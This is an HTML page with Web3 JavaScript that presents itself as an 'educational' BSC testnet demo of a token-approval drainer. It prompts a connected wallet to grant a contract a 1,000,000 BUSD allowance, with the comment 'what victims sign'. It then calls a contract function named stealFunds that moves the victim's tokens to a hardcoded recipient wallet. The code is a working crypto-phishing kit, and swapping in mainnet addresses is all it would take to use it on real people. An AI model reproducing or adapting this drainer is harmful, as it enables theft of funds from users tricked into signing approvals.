<!DOCTYPE html>
<html>
<head>
    <title>Token Approval Demo (BSC Testnet)</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
        button { padding: 10px; margin: 5px; cursor: pointer; }
        #walletInfo { display: none; margin-top: 20px; }
        .warning { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Token Approval Demo (BSC Testnet)</h1>
    <p class="warning">FOR EDUCATIONAL PURPOSES ONLY. USE TESTNET WALLET.</p>

    <button id="connectWallet">Connect Wallet</button>
    
    <div id="walletInfo">
        <p>Connected: <strong id="walletAddress"></strong></p>
        <button id="checkAllowance">Check BUSD Approval</button>
        <button id="requestApproval">Request BUSD Approval</button>
        <button id="demoTransfer">Simulate Transfer (Owner Only)</button>
        <p id="status"></p>
    </div>

    <script>
        // BSC Testnet Contracts
        const BUSD_TESTNET = "0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47";
        const DEMO_CONTRACT = "0x0de54379616ae1cfcf99102f80510462693b2e3e"; // Your deployed contract
        const RECIPIENT_WALLET = "0xefd427A1224fD494F9940C4DbbEbd933b923C170"; // Funds sent here

        let web3;
        let accounts = [];

        // Connect Wallet
        document.getElementById('connectWallet').onclick = async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    document.getElementById('walletAddress').textContent = accounts[0];
                    document.getElementById('walletInfo').style.display = 'block';
                    updateStatus("Wallet connected. Switch to BSC Testnet!");
                } catch (error) {
                    updateStatus("User denied access.");
                }
            } else {
                updateStatus("MetaMask not detected!");
            }
        };

        // Check BUSD Allowance
        document.getElementById('checkAllowance').onclick = async () => {
            const erc20 = new web3.eth.Contract([
                {
                    "constant": true,
                    "inputs": [
                        {"name": "owner", "type": "address"},
                        {"name": "spender", "type": "address"}
                    ],
                    "name": "allowance",
                    "outputs": [{"name": "", "type": "uint256"}],
                    "type": "function"
                }
            ], BUSD_TESTNET);

            const allowance = await erc20.methods.allowance(accounts[0], DEMO_CONTRACT).call();
            updateStatus(`Current BUSD allowance: ${allowance / 1e18} (Raw: ${allowance})`);
        };

        // Request Approval (What victims sign)
        document.getElementById('requestApproval').onclick = async () => {
            const erc20 = new web3.eth.Contract([
                {
                    "constant": false,
                    "inputs": [
                        {"name": "spender", "type": "address"},
                        {"name": "amount", "type": "uint256"}
                    ],
                    "name": "approve",
                    "outputs": [{"name": "", "type": "bool"}],
                    "type": "function"
                }
            ], BUSD_TESTNET);

            try {
                await erc20.methods.approve(DEMO_CONTRACT, web3.utils.toWei("1000000")).send({ from: accounts[0] });
                updateStatus("Approval successful! Now the contract can move your test BUSD.");
            } catch (error) {
                updateStatus(`Approval failed: ${error.message}`);
            }
        };

        // Simulate Transfer (Only owner can call)
        document.getElementById('demoTransfer').onclick = async () => {
            const contract = new web3.eth.Contract([
                {
                    "constant": false,
                    "inputs": [{"name": "victim", "type": "address"}],
                    "name": "stealFunds",
                    "outputs": [],
                    "type": "function"
                }
            ], DEMO_CONTRACT);

            try {
                await contract.methods.stealFunds(accounts[0]).send({ from: accounts[0] });
                updateStatus("Funds transferred to 0xefd4...C170. Check BscScan!");
            } catch (error) {
                updateStatus(`Transfer failed: ${error.message}`);
            }
        };

        function updateStatus(message) {
            document.getElementById('status').innerHTML = message;
        }
    </script>
</body>
</html>
